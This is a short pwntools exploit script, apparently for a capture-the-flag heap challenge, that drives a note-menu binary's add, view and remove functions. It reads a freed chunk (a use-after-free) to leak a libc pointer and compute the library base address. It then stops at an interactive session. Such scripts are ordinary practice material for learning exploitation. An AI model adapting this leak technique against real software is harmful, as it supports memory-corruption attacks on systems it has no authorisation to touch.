from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def add(ind, siz, data):
    sl(b"1")
    sla(b"Choose index:\n", str(ind).encode())
    sla(b"Title:\n", b"JUNKJUNK")
    sla(b"Input content size:\n", str(siz).encode())
    sla(b"Content:", data)

def view(ind):
    sl(b"2")
    sla(b"Which?\n", str(ind).encode())

def edit(ind, data):
    sl(b"3")
    sla(b"Which?\n", str(ind).encode())
    sla(b"Enter new content:\n", data)

def remove(ind):
    sl(b"4")
    sla(b"Which?\n", str(ind).encode())

add(0, 1033, 'bruh')
add(1, 1033, 'bruh')
add(2, 1033, 'bruh')
add(3, 1033, 'bruh')

remove(0)
remove(2)

view(0)

ru("Content: ")
libc.address = u64(re(6).ljust(8, b'\x00')) - 0x1ecbe0

ic(hex(libc.address))
io.interactive()
